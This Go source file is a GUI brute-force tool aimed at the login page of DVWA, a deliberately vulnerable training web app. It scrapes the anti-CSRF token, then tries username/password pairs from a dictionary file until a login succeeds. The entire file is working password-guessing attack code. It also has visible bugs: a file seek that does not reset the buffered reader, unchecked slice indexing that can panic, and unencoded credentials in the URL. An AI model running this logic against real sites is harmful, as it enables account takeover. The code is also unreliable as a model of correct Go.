//Brute Force
package main

import (
	"fmt"
    "strings"
    "io/ioutil"
	"net/http"
	"os"
	"io"
	"bufio"
)


// 带cookie和token，进行爆破
func BfWithCookie(cookstr string,fuckurl string,username string,password string) bool {
	client := &http.Client{};
	reqest, err := http.NewRequest("GET", fuckurl, nil)
	if err != nil{
		return false
	}
	cookie2 := &http.Cookie{Name:"PHPSESSID",Value:cookstr,HttpOnly:true};
	cookie3 := &http.Cookie{Name:"security",Value:"high",HttpOnly:true};
	reqest.AddCookie(cookie2)
	reqest.AddCookie(cookie3)

	resp1,err := client.Do(reqest);
	if err != nil{
		return false
	}
	defer resp1.Body.Close()
	content1,_ := ioutil.ReadAll(resp1.Body)
	tokenfk := GetToken(string(content1))
	fuckurl2 := fuckurl + "?username="+username+"&password="+password+"&Login=Login&user_token="+tokenfk
	reqest2, err := http.NewRequest("GET", fuckurl2,nil)
	if err != nil{
		return false
	}
	reqest2.AddCookie(cookie2)
	reqest2.AddCookie(cookie3)
	resp2,err := client.Do(reqest2);
	body, err := ioutil.ReadAll(resp2.Body)
    if err != nil {
        return false
    }
	bd := string(body)
	if strings.LastIndex(bd, "incorrect") == -1{
		return true
	}
	return false
} 


//读取字典文件，进行爆破
func ExcBrute(cookie string,urlDVWA string,sw *BruteSubWindow) bool {
	sw.pushAble = false
	dictPath := sw.filePath
	urlDVWABrute := urlDVWA + "vulnerabilities/brute/"
   	file, err := os.OpenFile(dictPath, os.O_RDWR, 0666)
   	if err != nil {
		sw.outPut.SetText("Open file error!")
      	return false
   	}
	defer file.Close()
	   
	buf := bufio.NewReader(file)
	count1 :=0
	for {
		_,err := buf.ReadString('\n')
		if err!= nil{
			break
		}
		count1++

	}
	file.Seek(0, os.SEEK_SET)
	sw.progressBar.SetRange(0,count1)
	sw.progressBar.SetValue(0)
	count := 1
   	for {
      	line, err := buf.ReadString('\n')
		line = strings.TrimSpace(line)
		kv := strings.Split(line, " ")
		temp := fmt.Sprintf("test%d:\r\nusername:%s\r\npassword:%s\r\n\r\n",count,kv[0],kv[1])
		sw.progressBar.SetValue(count-1)
		sw.outPut.AppendText(temp)
		count++
		if BfWithCookie(cookie,urlDVWABrute,kv[0],kv[1]) == true{
			sw.outPut.AppendText("\nsuccess!\r\n")
			sw.progressBar.SetValue(count1)
			break
		}
		if count%5 == 0{
			sw.outPut.SetText("")
		}
      	if err != nil {
         	if err == io.EOF {
            	fmt.Println("no pattern!")
            	return false
         	} else {
            	fmt.Println("error!", err)
            	return false
         	}
      	}
	   }
	   sw.pushAble = true
	   return true
}